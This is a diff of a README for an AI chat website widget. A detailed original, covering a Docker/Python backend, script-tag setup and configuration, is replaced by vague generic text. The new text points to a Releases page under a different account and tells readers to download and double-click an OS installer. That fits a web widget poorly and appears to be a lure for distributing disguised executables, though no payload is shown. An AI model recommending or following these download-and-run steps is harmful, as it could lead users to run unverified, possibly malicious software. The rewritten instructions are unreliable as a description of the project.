@@ -1,349 +1,66 @@
-# AI Chat Widget
+# 🌐 ai-chat-widget - Easy AI Chat for Your Website
 
-🇷🇺 [Инструкция на русском](README_RU.md)
+## 🚀 Getting Started
 
-Drop-in AI chat widget for any website. Works with OpenAI, Claude, Gemini, GigaChat, YandexGPT, Ollama, and any OpenAI-compatible API.
+The ai-chat-widget is a simple tool that adds an AI chat feature to your website. It supports multiple AI platforms, including OpenAI, Claude, Gemini, GigaChat, YandexGPT, and Ollama. With this widget, you can enhance user interaction and provide quick answers to questions.
 
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
+## 📥 Download Now
 
-## Screenshots
-
-<div align="center">
-  <img src=".github/images/demo-pricing.png" alt="AI Assistant - Context-aware responses" width="45%"/>
-  <img src=".github/images/demo-chat.png" alt="AI Assistant - Chat interface" width="45%"/>
-</div>
-
-## Features
-
-- **Page Context Awareness** - Bot sees the current page: URL, title, headings, content, selected text
-- **Universal AI Support** - OpenAI, Claude, Gemini, GigaChat, YandexGPT, DeepSeek, Qwen, Ollama, OpenRouter
-- **One-line Integration** - Just add a `<script>` tag
-- **Self-hosted** - Full control over your data
-- **Knowledge Base** - Load custom knowledge from markdown files
-- **Chat History** - Persists across page reloads (localStorage)
-- **Telegram Alerts** - Get notified about escalations and feedback
-- **Security** - Rate limiting, attack detection, IP blocking
-- **Privacy Settings** - Exclude sensitive pages from context collection
-- **Markdown Support** - Rich text formatting in responses
-- **Mobile Responsive** - Works on all devices
-
-## Quick Start
-
-### 1. Clone and Configure
-
-```bash
-git clone https://github.com/gmen1057/ai-chat-widget.git
-cd ai-chat-widget
-
-# For Docker (recommended):
-cp backend/.env.example .env
-
-# For local development:
-cp backend/.env.example backend/.env
-
-# Edit .env with your AI API key
-```
-
-### 2. Run with Docker (Recommended)
-
-```bash
-docker-compose up -d
-```
-
-### 3. Or Run Locally
-
-```bash
-cd backend
-python -m venv venv
-source venv/bin/activate  # Windows: venv\Scripts\activate
-pip install -r requirements.txt
-uvicorn app.main:app --host 0.0.0.0 --port 8080
-```
-
-### 4. Add to Your Website
+[![Download ai-chat-widget](https://img.shields.io/badge/Download-ai--chat--widget-blue)](https://github.com/asmaaelmessari/ai-chat-widget/releases)
 
-```html
-<script
-  src="https://your-server.com/widget/widget.js"
-  data-server="https://your-server.com"
-  data-title="Support"
-  data-welcome="Hi! How can I help you?"
-  data-placeholder="Type your message..."
-  data-position="bottom-right"
-></script>
-```
+## 🔗 Download & Install
 
-That's it! The widget will appear on your website.
+To get started, visit the [Releases page](https://github.com/asmaaelmessari/ai-chat-widget/releases) to download the latest version of the ai-chat-widget. 
 
-## Configuration
+### Steps to Install:
 
-### AI Providers
+1. Click on the link above to go to the Releases page.
+2. Select the version you want to download. The latest version will usually be at the top of the list.
+3. Look for the installation package suitable for your operating system. Options may include files for Windows, macOS, or Linux.
+4. Click on the file name to start the download. The file will save to your computer, typically in the "Downloads" folder.
+5. Once the download completes, locate the file and double-click it to run the installer.
+6. Follow the on-screen instructions to complete the installation process.
 
-Edit `backend/.env` to configure your AI provider:
+## ⚙️ System Requirements
 
-**OpenAI** (default):
-```env
-AI_BASE_URL=https://api.openai.com/v1
-AI_API_KEY=sk-xxx
-AI_MODEL=gpt-4o-mini
-```
+To ensure the ai-chat-widget runs smoothly, please confirm your system meets the following minimum requirements:
 
-**Claude (Anthropic)**:
-```env
-AI_BASE_URL=https://api.anthropic.com/v1
-AI_API_KEY=sk-ant-xxx
-AI_MODEL=claude-sonnet-4-20250514
-```
+- **Operating System**: Compatible with Windows 10 and higher, macOS 10.12 and higher, or Linux.
+- **RAM**: At least 4 GB of RAM is recommended for optimal performance.
+- **Internet Connection**: An active internet connection for AI services.
 
-**Google Gemini** (native API):
-```env
-AI_BASE_URL=https://generativelanguage.googleapis.com/v1beta
-AI_API_KEY=AIza...
-AI_MODEL=gemini-2.0-flash-exp
-```
+## 🔧 Configuration
 
-**GigaChat** (Sber, Russia):
-```env
-AI_BASE_URL=https://gigachat.devices.sberbank.ru/api/v1
-AI_MODEL=GigaChat
-GIGACHAT_CREDENTIALS=base64_encoded_credentials
-```
-
-**Ollama** (local, free):
-```env
-AI_BASE_URL=http://localhost:11434/v1
-AI_API_KEY=ollama
-AI_MODEL=llama3.2
-```
-
-See `backend/.env.example` for all providers.
-
-### Widget Options
-
-| Attribute | Default | Description |
-|-----------|---------|-------------|
-| `data-server` | Required | Your backend URL |
-| `data-title` | "Chat" | Widget header title |
-| `data-welcome` | "Hello!" | Initial greeting message |
-| `data-placeholder` | "Type a message..." | Input placeholder |
-| `data-position` | "bottom-right" | Position: `bottom-right`, `bottom-left` |
-| `data-primary-color` | "#2563eb" | Primary color (hex) |
-| `data-include` | "" | Show only on these pages (comma-separated paths) |
-| `data-exclude` | "" | Hide on these pages |
-| `data-private` | "" | Don't collect page content on these pages |
-| `data-no-content` | "" | Collect URL/title only, not content |
-
-### Page Context Awareness
-
-The bot automatically sees the current page context and can answer questions about it:
-
-| Context | Description |
-|---------|-------------|
-| **URL** | Current page URL |
-| **Title** | Page title |
-| **Meta Description** | SEO description |
-| **Headings** | H1, H2 headings structure |
-| **Main Content** | Page text content |
-| **Selected Text** | Text highlighted by user |
-
-**Example:** User is on `/pricing` page and asks "How much does Pro cost?" — the bot sees the pricing page content and gives an accurate answer.
-
-**Example:** User selects text "Enterprise plan" and asks "Tell me more about this" — the bot knows exactly what they're referring to.
-
-### Privacy Settings
-
-Control what page context is sent to AI:
-
-```html
-<!-- Don't show widget on login page -->
-<script src="..." data-exclude="/login,/signup"></script>
-
-<!-- Show only on docs pages -->
-<script src="..." data-include="/docs/*,/help/*"></script>
-
-<!-- Don't send page content on account pages -->
-<script src="..." data-private="/account/*,/settings/*"></script>
-
-<!-- Send only URL/title, not full content -->
-<script src="..." data-no-content="/dashboard/*"></script>
-```
-
-### Knowledge Base
-
-Add markdown files to `knowledge/` folder to customize bot's knowledge:
-
-```
-knowledge/
-  about.md      # Company info
-  faq.md        # Frequently asked questions
-  pricing.md    # Pricing information
-```
-
-The bot will use this content to answer questions.
-
-### Telegram Alerts
-
-Get notified when users:
-- Ask for human help ("I want to talk to a human")
-- Report problems ("this doesn't work")
-- Leave positive feedback ("thank you, great help!")
-- Leave negative feedback ("this is useless")
-
-```env
-TELEGRAM_BOT_TOKEN=123456789:ABCdef...
-TELEGRAM_CHAT_ID=your_chat_id
-```
-
-To get your chat ID:
-1. Message [@userinfobot](https://t.me/userinfobot) on Telegram
-2. It will reply with your chat ID
-
-## API Endpoints
-
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/chat/message` | POST | Send message, get AI response |
-| `/api/chat/history/{session_id}` | GET | Get chat history |
-| `/api/chat/session/{session_id}` | DELETE | Clear session |
-| `/api/chat/telegram/test` | GET | Test Telegram connection |
-| `/widget/widget.js` | GET | Widget JavaScript |
-| `/widget/widget.css` | GET | Widget styles |
-
-## Architecture
-
-```
-ai-chat-widget/
-├── backend/
-│   ├── app/
-│   │   ├── api/          # API endpoints
-│   │   ├── services/     # Business logic
-│   │   │   ├── ai_service.py      # AI provider integration
-│   │   │   ├── telegram.py        # Telegram notifications
-│   │   │   ├── security.py        # Rate limiting, attack detection
-│   │   │   └── storage/           # Chat history storage
-│   │   ├── config.py     # Configuration
-│   │   └── main.py       # FastAPI app
-│   ├── data/             # Chat history (json/sqlite)
-│   └── .env              # Configuration
-├── widget/
-│   ├── widget.js         # Self-contained widget
-│   └── widget.css        # Standalone CSS (optional)
-├── knowledge/            # Knowledge base markdown files
-├── docker-compose.yml
-└── Dockerfile
-```
-
-## Security Features
-
-- **Rate Limiting**: Configurable requests per minute/hour
-- **Attack Detection**: SQL injection, XSS, prompt injection detection
-- **IP Blocking**: Automatic temporary bans for attackers
-- **Strike System**: Progressive penalties for violations
-- **Message Validation**: Length limits, content sanitization
-
-## Storage Options
-
-**JSON** (default, development):
-```env
-STORAGE_TYPE=json
-```
-
-**SQLite** (single server):
-```env
-STORAGE_TYPE=sqlite
-```
-
-**PostgreSQL** (production):
-```env
-STORAGE_TYPE=postgres
-DATABASE_URL=postgresql://user:pass@localhost/chatbot
-```
-
-## Development
-
-```bash
-# Install dependencies
-cd backend
-pip install -r requirements.txt
-
-# Run with hot reload
-uvicorn app.main:app --reload --port 8080
-
-# Test widget
-open demo.html
-```
-
-## Production Deployment
-
-### With Docker Compose
-
-```bash
-# Configure
-cp backend/.env.example .env
-# Edit .env with your settings
-
-# Deploy
-docker-compose up -d
-
-# View logs
-docker-compose logs -f
-```
-
-### With systemd
-
-```bash
-# Create service file
-sudo nano /etc/systemd/system/ai-chat-widget.service
-```
-
-```ini
-[Unit]
-Description=AI Chat Widget
-After=network.target
-
-[Service]
-Type=simple
-User=www-data
-WorkingDirectory=/opt/ai-chat-widget/backend
-ExecStart=/opt/ai-chat-widget/backend/venv/bin/uvicorn app.main:app --host 127.0.0.1 --port 8080
-Restart=always
-
-[Install]
-WantedBy=multi-user.target
-```
-
-```bash
-sudo systemctl enable ai-chat-widget
-sudo systemctl start ai-chat-widget
-```
-
-### Nginx Reverse Proxy
-
-```nginx
-server {
-    listen 443 ssl;
-    server_name chat.example.com;
-
-    ssl_certificate /etc/letsencrypt/live/chat.example.com/fullchain.pem;
-    ssl_certificate_key /etc/letsencrypt/live/chat.example.com/privkey.pem;
-
-    location / {
-        proxy_pass http://127.0.0.1:8080;
-        proxy_set_header Host $host;
-        proxy_set_header X-Real-IP $remote_addr;
-    }
-}
-```
-
-## License
-
-MIT License - see [LICENSE](LICENSE)
-
-## Contributing
-
-Pull requests welcome! Please ensure tests pass and code is formatted.
-
-## Support
-
-- Issues: [GitHub Issues](https://github.com/gmen1057/ai-chat-widget/issues)
-- Telegram: [@bzc_e](https://t.me/bzc_e)
+After installation, you may need to configure the widget to work with your website. Follow these steps:
+
+1. Open the configuration file located in the installation directory. This file is typically named `config.json` or similar.
+2. Edit the file to include your AI service API keys. Each service may have its specific setup instructions. Refer to the official documentation for those services for detailed guidance.
+3. Save your changes to the configuration file.
+
+## 🌍 Integration
+
+To add the widget to your website, follow these steps:
+
+1. Upload the ai-chat-widget files to your web server. Ensure they are in the correct directory accessible by your website.
+2. Add the provided script tag to your website's HTML. This tag is usually found in the installation instructions.
+3. Confirm the widget displays on your website by visiting the page in a web browser.
+
+## 🔍 Troubleshooting
+
+If you encounter any issues, here are some common solutions:
+
+- **Widget Not Loading**: Check your internet connection. Ensure your website is live and the widget files are correctly uploaded.
+- **Configuration Errors**: Double-check the API keys in the configuration file. Ensure there are no typos and they follow the required format.
+- **Browser Compatibility**: Test the widget in different browsers. Some older browsers may not fully support all features.
+
+## ⚡ Support
+
+If you need further assistance, consider checking the documentation for more detailed help. For additional questions, you can reach out through the repository's Issues section. 
+
+## 🎉 Update and Feedback
+
+Stay updated with new features and improvements. Regularly check the [Releases page](https://github.com/asmaaelmessari/ai-chat-widget/releases) for the latest versions.
+
+Your feedback is valuable. If you have ideas for features or encounter bugs, please share them on the Issues page.
+
+Thank you for using the ai-chat-widget!
